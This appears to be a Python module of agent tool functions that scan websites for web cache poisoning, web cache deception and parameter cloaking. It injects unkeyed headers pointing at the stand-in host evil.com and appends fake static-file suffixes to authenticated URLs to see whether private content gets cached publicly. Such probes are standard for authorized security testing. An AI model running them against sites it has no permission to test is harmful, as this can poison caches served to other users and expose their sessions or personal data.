"""
Web Cache Poisoning & Cache Deception Prober
Tests for unkeyed header injection, cache deception attacks, and CDN cache poisoning.

Techniques:
- Unkeyed header injection (X-Forwarded-Host, X-Forwarded-For, X-Original-URL)
- Web cache deception (path confusion tricks cached content as public)
- Cache poisoning via fat GET (body in GET request)
- Host header cache poisoning
- Parameter cloaking (cache key normalization bugs)
"""

import requests
import time
import random
import string
from src.sdk.core import function_tool


def _get(url, headers, verify=False, timeout=10, allow_redirects=True):
    try:
        return requests.get(url, headers=headers, verify=verify,
                             timeout=timeout, allow_redirects=allow_redirects)
    except Exception:
        return None


def _random_canary():
    """Generate a unique canary value to detect cache poisoning."""
    return "CACHE-POISON-" + "".join(random.choices(string.ascii_uppercase, k=8))


@function_tool()
def cache_poisoning_unkeyed_header(
    target_url: str,
    headers: str = "{}"
):
    """
    Test for web cache poisoning via unkeyed HTTP headers.
    Injects X-Forwarded-Host, X-Forwarded-Port, X-Original-URL and checks if
    the injected value is reflected in cached responses to other users.

    Args:
        target_url: A cacheable URL to test (e.g. https://example.com/home)
        headers: JSON string of base request headers
    """
    import json
    try:
        base_hdrs = json.loads(headers)
    except Exception:
        base_hdrs = {}

    results = [f"[CACHE-POISON] Testing unkeyed header injection: {target_url}"]

    attack_headers = [
        {"X-Forwarded-Host": "evil.com"},
        {"X-Forwarded-Host": "evil.com", "X-Forwarded-Scheme": "http"},
        {"X-Host": "evil.com"},
        {"X-Forwarded-Server": "evil.com"},
        {"X-HTTP-Host-Override": "evil.com"},
        {"Forwarded": "host=evil.com"},
        {"X-Original-URL": f"/evil-path?{_random_canary()}"},
        {"X-Rewrite-URL": "/evil-path"},
    ]

    poisoned = []

    for inject in attack_headers:
        canary = _random_canary()
        req_hdrs = {**base_hdrs, **inject, "Cache-Control": "no-cache", "X-Cache-Test": canary}

        # First: poison the cache
        resp1 = _get(target_url, req_hdrs)

        if resp1 is None:
            results.append(f"[ERROR] No response for {list(inject.keys())[0]}")
            continue

        # Second: fetch without the attack header to see if poisoned response is cached
        time.sleep(0.5)
        clean_hdrs = {**base_hdrs, "Cache-Control": "max-age=0"}
        resp2 = _get(target_url, clean_hdrs)

        header_name = list(inject.keys())[0]
        inject_val = list(inject.values())[0]

        if resp2 and inject_val.split("/")[0] in resp2.text:
            poisoned.append(header_name)
            results.append(f"[VULNERABLE] {header_name}: '{inject_val}' reflected in cached response!")
            results.append(f"  Evidence: ...{resp2.text[max(0,resp2.text.find(inject_val.split('/')[0])-30):resp2.text.find(inject_val.split('/')[0])+60]}...")
        else:
            hit = resp1.headers.get("X-Cache", resp1.headers.get("CF-Cache-Status", "unknown"))
            results.append(f"[OK] {header_name}: Not reflected (cache: {hit})")

    results.append(f"\n{'='*50}")
    if poisoned:
        results.append(f"⚠️  CACHE POISONING: {len(poisoned)} unkeyed headers accepted")
        results.append("Impact: Inject malicious content into cached pages served to all users")
        for h in poisoned:
            results.append(f"  ✗ {h}")
    else:
        results.append("No cache poisoning via unkeyed headers detected")

    return "\n".join(results)


@function_tool()
def cache_deception_probe(
    authenticated_url: str,
    headers: str = "{}"
):
    """
    Probe for Web Cache Deception — trick cache into storing authenticated content as public.
    Appends fake static file extensions and path segments to sensitive URLs.

    Args:
        authenticated_url: A URL returning sensitive authenticated data (e.g. /account/profile)
        headers: JSON of session/auth headers
    """
    import json
    try:
        base_hdrs = json.loads(headers)
    except Exception:
        base_hdrs = {}

    results = [f"[CACHE-DECEPTION] Testing: {authenticated_url}"]

    # Get baseline with auth
    baseline = _get(authenticated_url, base_hdrs)
    if baseline is None or baseline.status_code != 200:
        results.append(f"[ERROR] Baseline request failed: HTTP {baseline.status_code if baseline else 'ERR'}")
        return "\n".join(results)

    baseline_body = baseline.text
    results.append(f"[BASELINE] Authenticated response: HTTP 200, {len(baseline_body)} bytes")

    # Path confusion payloads
    suffixes = [
        "/nonexistent.css",
        "/nonexistent.js",
        "/nonexistent.jpg",
        "/nonexistent.png",
        "/style.css",
        "/app.js",
        "/../profile.css",
        ".css",
        "%3B.js",
    ]

    vulnerable = []
    base_url_clean = authenticated_url.rstrip("/")

    for suffix in suffixes:
        attack_url = base_url_clean + suffix

        # Request WITH auth (poison the cache)
        resp1 = _get(attack_url, base_hdrs)

        if resp1 is None or resp1.status_code != 200:
            results.append(f"[SKIP] {suffix} → HTTP {resp1.status_code if resp1 else 'ERR'}")
            continue

        # Check if sensitive content is in the response
        content_overlap = len(set(baseline_body[:500].split()) & set(resp1.text[:500].split()))

        if content_overlap > 5 and len(resp1.text) > 100:
            # Now try WITHOUT auth to see if it's cached publicly
            time.sleep(0.5)
            no_auth_hdrs = {k: v for k, v in base_hdrs.items() if "auth" not in k.lower() and "cookie" not in k.lower() and "token" not in k.lower()}
            resp2 = _get(attack_url, no_auth_hdrs)

            if resp2 and resp2.status_code == 200 and content_overlap > 5:
                if len(resp2.text) > 100:
                    vulnerable.append(attack_url)
                    results.append(f"[VULNERABLE] {suffix}: Sensitive data accessible without auth!")
                    results.append(f"  Authenticated URL cached as: {attack_url}")
                else:
                    results.append(f"[PARTIAL] {suffix}: Content present but small ({len(resp2.text)} bytes)")
            else:
                results.append(f"[OK] {suffix}: Accessible with auth but not publicly cached")
        else:
            results.append(f"[OK] {suffix} → Returns different content from authenticated endpoint")

    results.append(f"\n{'='*50}")
    if vulnerable:
        results.append(f"⚠️  WEB CACHE DECEPTION: {len(vulnerable)} paths expose authenticated content publicly")
        results.append("Impact: Unauthenticated users can steal sessions/PII from cache")
    else:
        results.append("No web cache deception detected")

    return "\n".join(results)


@function_tool()
def cache_parameter_cloaking(
    target_url: str,
    param_name: str = "utm_content",
    headers: str = "{}"
):
    """
    Test for parameter cloaking in cache keys — injecting parameters that are excluded
    from the cache key but processed server-side (e.g. utm_ params, callback=).

    Args:
        target_url: URL to test (e.g. https://example.com/api/data)
        param_name: Query parameter to inject as unkeyed (default: utm_content)
        headers: JSON of request headers
    """
    import json
    try:
        base_hdrs = json.loads(headers)
    except Exception:
        base_hdrs = {}

    results = [f"[PARAM-CLOAKING] Testing param cloaking: {target_url}"]

    # Common unkeyed parameters (CDNs often strip analytics params from cache keys)
    unkeyed_params = [
        "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term",
        "fbclid", "gclid", "_ga", "ref", "source", "callback",
    ]

    for param in unkeyed_params:
        canary = _random_canary()
        test_url = f"{target_url}{'&' if '?' in target_url else '?'}{param}={canary}"

        resp = _get(test_url, base_hdrs)
        if resp and canary in resp.text:
            results.append(f"[REFLECTED] '{param}={canary}' reflected in response")
            results.append("  If this param is excluded from cache key → cache poisoning possible!")
            results.append("  ⚠️  TEST MANUALLY: Verify via cache hit with second fresh request")
        else:
            results.append(f"[OK] {param}: Not reflected or not unkeyed")

    return "\n".join(results)
